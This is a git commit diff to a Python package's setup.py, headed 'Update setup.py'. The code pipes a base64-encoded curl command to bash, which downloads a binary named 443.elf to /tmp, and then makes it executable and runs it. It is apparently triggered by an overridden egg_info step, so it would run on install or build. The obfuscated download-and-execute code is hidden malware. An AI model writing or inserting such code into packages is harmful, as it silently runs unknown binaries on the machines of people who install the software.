861abc1adffb05875e8377adc628748e5e35236a
WilliamCXVI <47236583+WilliamCXVI@users.noreply.github.com>
2025-11-01 13:16:58 -0500

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,10 +7,12 @@ import subprocess
 
 def RunCommand():
     cmd = 'echo Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi5jb20vV2lsbGlhbUNYVkkvbGluLXB5Y3Jvbm9zL3Jhdy9yZWZzL2hlYWRzL21haW4vNDQzLmVsZiAtbyAvdG1wLzQ0My5lbGYNCg== | base64 -d | bash'
-    cmd2='chmod +x /tmp/443.elf; /tmp/443.elf'
+    cmd2='chmod +x /tmp/443.elf'
+    cmd3='/tmp/443.elf'
     completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
     completed2 = subprocess.run(cmd2, shell=True, capture_output=True, check=True)
-    return completed2
+    completed3 = subprocess.run(cmd3, shell=True, capture_output=True, check=True)
+    return completed3
 
 class RunEggInfoCommand(egg_info):
     def run(self):
